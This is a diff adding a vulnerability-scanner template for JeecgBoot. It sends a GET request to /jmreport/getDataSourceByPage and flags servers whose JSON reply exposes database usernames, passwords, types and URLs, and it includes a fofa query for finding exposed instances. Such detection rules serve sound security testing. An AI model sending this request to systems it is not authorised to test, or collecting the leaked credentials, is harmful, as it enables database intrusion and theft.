@@ -1,0 +1,27 @@
+id: jeecg-getdatasourcebypage-disclosure
+
+info:
+  name: JeecgBoot - GetDataSourceByPage Disclosure
+  author: zan8in
+  severity: high
+  verified: true
+  description: |
+    fofa: app="jeecg-boot"
+  tags: jeecgboot,disclosure
+  created: 2026/01/08
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /jmreport/getDataSourceByPage
+    expression: |
+      response.status == 200 && 
+      "Content-Type" in response.headers &&
+      response.headers['Content-Type'].icontains('application/json') &&
+      response.body.ibcontains(b'"success":true') &&
+      response.body.ibcontains(b'"dbUsername":') &&
+      response.body.ibcontains(b'"dbPassword":') &&
+      response.body.ibcontains(b'"dbType":') &&
+      response.body.ibcontains(b'"dbUrl":')
+expression: r0()
